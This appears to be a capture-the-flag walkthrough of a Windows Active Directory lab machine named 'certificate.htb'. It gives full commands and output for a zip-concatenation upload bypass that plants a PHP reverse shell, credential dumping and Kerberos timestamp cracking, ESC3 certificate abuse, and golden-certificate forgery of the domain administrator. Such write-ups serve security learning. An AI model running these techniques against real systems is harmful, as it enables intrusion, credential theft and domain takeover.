
#php #file_upload #pcap #Golden_Certificate #SeManageVolumePrivilege
## Summary
- The trick in `zip` file_upload, which accept only `.pdf` `.docx` `.pptx` `.xlsx` . So we can't upload reverse shell with `php` or other file extensions.
  but we can upload reverse shell, By compressing `.pdf` ,then compress the `malicious` folder that contain reverse shell, then compine them in one zip file
	- **Not nested** (in the usual sense). `main.zip` is not automatically decompressed into `head.zip` and `tail.zip` as separate files unless `head.zip`/`tail.zip` are themselves entries recorded in the CD as files (i.e., if the central directory lists them as members named `head.zip` and `tail.zip`).
	- Typically the result is: `main.zip` is interpreted as _one ZIP archive_ which may contain the entries from head and/or tail, depending on the final CD that the extractor reads. In this situation its 
	  `tail.zip` which get decompressed to.
```
> ls
malicious_dir test.pdf

\malicious_dir> ls
shell.php

> zip head.zip test.pdf
> zip -r tail.zip malicious_dir
> cat head.zip tail.zip > main.zip

```

- Another Trick, Looking at `pcap`. Someone has used `kerberos` to authenticate to `SMB` shares, That enabled us to crack the encrypted timestamp in order to get the actual password.
- `Golden certificate`: we were able to get the private key, Using it we can forge any user in the Domain and get his certificate. 

---
10.10.11.71

We will start with nmap:
```
PORT     STATE SERVICE       REASON          VERSION       
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS              
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-26 19:37:42Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-26T19:39:05+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
```

Start to enumerate website
Files in root directory:
```
login                   [Status: 200, Size: 9412, Words: 831, Lines: 230, Duration: 291ms]           
register                [Status: 200, Size: 10916, Words: 932, Lines: 256, Duration: 228ms]
index                   [Status: 200, Size: 22420, Words: 5934, Lines: 582, Duration: 225ms]
about                   [Status: 200, Size: 14826, Words: 3211, Lines: 372, Duration: 224ms]
blog                    [Status: 200, Size: 21940, Words: 1403, Lines: 566, Duration: 225ms]
header                  [Status: 200, Size: 1848, Words: 427, Lines: 46, Duration: 2563ms]
footer                  [Status: 200, Size: 2955, Words: 164, Lines: 71, Duration: 306ms]
contacts                [Status: 200, Size: 10605, Words: 887, Lines: 264, Duration: 127ms]
upload                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2398ms]
courses                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 95ms]
About                   [Status: 200, Size: 14826, Words: 3211, Lines: 372, Duration: 147ms]
db                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 218ms] 
```


Looking at the website it seem is have file upload, but the file should be compressed first then get uploaded. 
We will use this trick [[Zip Upload]] .
```
> ls mal
shell.php

> zip head.zip file.pdf ;
> zip -r tail.zip malicious_dir ;
> cat head.zip tail.zip > main.zip
```

Then we upload this zip file, and instead of requesting `file.pdf` we will request `malicious_dir/shell.php`. And we should have our listener up.
```
rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444         
Connection received on 10.10.11.71 51382   
SOCKET: Shell has connected! PID: 1604
Microsoft Windows [Version 10.0.17763.6532]
(c) 2018 Microsoft Corporation. All rights reserved.                                             
 
C:\xampp\htdocs\certificate.htb\static\uploads\8b5d16fef8657ce608dd90c3ef106207\mal>
```

looking at `db.php`:
```
C:\xampp\htdocs\certificate.htb>type db.php                                                                                                                                                       
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

Start a pivot and connecting to the database:
```
mysql -u certificate_webapp_user -p'cert!f!c@teDBPWD' -h 240.0.0.1 -P 3306 -D Certificate_WEBAPP_DB
```

Found Credentials for admin user:
```
+-----------+--------------------------------------------------------------+---------+
| username  | password                                                     | role    |
+-----------+--------------------------------------------------------------+---------+
| Lorra.AAA | $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG | teacher |
| Sara1200  | $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK | teacher |
| Johney    | $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq | student |
| havokww   | $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti | teacher |
| stev      | $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2 | student |
| sara.b    | $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6 | admin   |
| slo       | $2y$04$0DF4rkYPm9szG7o4xHirQOp3GASBytdhVpw2J2wgX5UphwhoDws02 | student |
+-----------+--------------------------------------------------------------+---------+
```

`sara.b` : `Blink182`

Doing bloodhound, We find that we can do winrm:
![[Z Assets/Images/Pasted image 20250930044114.jpeg]]

We found wired `.pcap` file. `C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap`. And we found text file that says:
```txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

Looking at `WS-01_PktMon.pcap`, We found that there is `SMB` requests most of them has failed but there was successful one which use kerberos:
![[Z Assets/Images/Pasted image 20250930044912.jpeg]]

We can inspect this request, And we find timestamp is encrypted "Encrypted with the actual password of the user."
![[Z Assets/Images/Pasted image 20250930045511.jpeg]]

Modify the encrypted string so hashcat can undestand it and we can try to crack it:
```
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

We got credentials:
`lion.sk` : `!QAZ2wsx`

Using `certipy` we found that we have vuln certificate:
```
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.

```


Exploitation:

```steps
certipy req \
    -u 'lion.sk' -p '!QAZ2wsx' \
    -dc-ip '10.10.11.71' -target 'DC01.certificate.htb' \
    -ca 'CERTIFICATE-DC01-CA' -template 'Delegated-CRA' -ns 10.10.11.71 


certipy req \
    -u 'lion.sk' -p '!QAZ2wsx' \
    -dc-ip '10.10.11.71' -target 'DC01.certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -pfx 'lion.sk.pfx' -on-behalf-of 'ryan.k' -ns 10.10.11.71 

certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6

```


Exploitaion was not direct because there is policy that prevent me from accessing requesting certificate of all people, but we can request certificate of some users. Ex. `Ryan.K`.
We can do lateral movement, And we found an intersting group that `ryan.k` is member of, which is `DOMAIN STORAGE MANAGERS` group. And he can do winrm.
![[Z Assets/Images/Pasted image 20250930132533.jpeg]]

Getting `user.txt`.

---

Doing winrm as `ryan.k` user. Then looking at my privileges:
```
PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

We are in `SeManageVolumePrivilege`, we can exploit it. there is repo in github that exploit it.
The binary give us read, write access to big number of system files, but some files will stay unaccessable, that's ok because you  now have access to other things you can study it more.

Going with the repo we managed to have privilege to read more files in the system but will fail in putting the `Printconfig.dll` because `C:\Windows\System32\spool\drivers\x64\3` is not present in the system. So we must find another way. But what we have done is very usefull for future exploit... Read more

## Golden certificate
[[Golden Certificate]]

check the certificate discovery verification through the Signature test passed:
```
*Evil-WinRM* PS C:\windows> certutil -Store

================ Certificate 0 ================                                                                                                                                  18:37:48 [58/3974]
Serial Number: 06376c00aa00648a11cfb8d4aa5c35f4 
Issuer: CN=Root Agency                           
 NotBefore: 5/28/1996 3:02 PM                    
 NotAfter: 12/31/2039 4:59 PM                    
Subject: CN=Root Agency                          
Signature matches Public Key                     
Root Certificate: Subject matches Issuer         
Cert Hash(sha1): fee449ee0e3965a5246f000e87fde2a065fd89d4                                          
No key provider information                                                                        
Cannot find the certificate and private key for decryption.                                        


================ Certificate 1 ================  
Serial Number: 46fcebbab4d02f0f926098233f93078f  
Issuer: OU=Class 3 Public Primary Certification Authority, O=VeriSign, Inc., C=US                  
 NotBefore: 4/16/1997 5:00 PM                                                                      
 NotAfter: 10/24/2016 4:59 PM                    
Subject: OU=www.verisign.com/CPS Incorp.by Ref. LIABILITY LTD.(c)97 VeriSign, OU=VeriSign International Server CA - Class 3, OU=VeriSign, Inc., O=VeriSign Trust Network
Non-root Certificate
Cert Hash(sha1): d559a586669b08f46a30a133f8a9ed3d038e2ea8                                                                                                                                          
No key provider information
Cannot find the certificate and private key for decryption.                                                                                                                                        

================ Certificate 2 ================
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb                                                                                                                                             
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb                                                                                                                                            
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7                                                                                                                                          
No key provider information
  Provider = Microsoft Software Key Storage Provider                                                                                                                                               
  Simple container name: certificate-DC01-CA
  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958                                                                                                     
  ERROR: missing key association property: CERT_KEY_IDENTIFIER_PROP_ID                                                                                                                             
Signature test passed

```

if you still can't see it, We have `CA cert` certificate type, which is special type of certificate that its private key can be used to sign other certificates in AD. 
You can use this which more simpler:
```powershell
Get-ChildItem Cert:\LocalMachine\My | ForEach-Object { $thumb = $_.Thumbprint; $subj  = $_.Subject; $hasPK = if ($_.HasPrivateKey) {'yes'} else {'no'}; $ku = ($_.Extensions | Where-Object { $_.Oid.Value -in @('2.5.29.15','2.5.29.19') } ).Format($false) ;[pscustomobject]@{Thumb=$thumb; Subject=$subj; HasPrivateKey=$hasPK; KeyUsage=$ku} } | Format-Table -AutoSize

 Thumb                                    Subject                                       HasPrivateKey KeyUsage
-----                                    -------                                       ------------- -------- 
54FA062A494DD818B02B834CB8C5C319FA4FEA8C CN=DC01.certificate.htb                       yes           Digital Signature, Key Encipherment (a0)                                                      
2F02901DCFF083ED3DBB6CB0A15BBFEE6002B1A8 CN=Certificate-LTD-CA, DC=certificate, DC=htb yes           {Digital Signature, Certificate Signing, Off-line CRL Signing, CRL Signing (86), Subject Type=CA, Path Length Constraint=None}
```

We will try to get the private key of `CN=Certificate-LTD-CA`, 
```powershell
certutil -exportPFX My 2F02901DCFF083ED3DBB6CB0A15BBFEE6002B1A8 Certificate-LTD-CA.pfx

# Download it to my linux machine
download Certificate-LTD-CA.pfx
```

We will use this private key to sign new certificate that have the administrator upn:
```
certipy forge \                                                                              
    -ca-pfx 'Certificate-LTD-CA.pfx' -upn 'administrator@certificate.htb' \                      
    -sid 'S-1-5-21-515537669-4223687196-3249690583-500' -crl 'ldap:///' 
```

Try to auth using this forged certificate as admin:
```
certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.11.71'

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb' 
[*]     SAN URL SID: 'S-1-5-21-515537669-4223687196-3249690583-500'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-500'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT                                     
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

GG

---

```steps
certipy req \
    -u 'lion.sk' -p '!QAZ2wsx' \
    -dc-ip '10.10.11.71' -target 'DC01.certificate.htb' \
    -ca 'CERTIFICATE-DC01-CA' -template 'Delegated-CRA' -ns 10.10.11.71 


certipy req \                                                                                                                                                                                  
    -u 'lion.sk' -p '!QAZ2wsx' \
    -dc-ip '10.10.11.71' -target 'DC01.certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -pfx 'lion.sk.pfx' -on-behalf-of 'ryan.k' -ns 10.10.11.71 

certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6

```


```collectors
bloodhound-ce-python -d certificate.htb -dc dc01.certificate.htb -u 'sara.b@certificate.htb' -p 'Blink182'  --collection All --zip -k -ns 10.10.11.71
rusthound-ce -u 'sara.b' -p 'Blink182' -d certificate.htb -f dc01.certificate.htb

```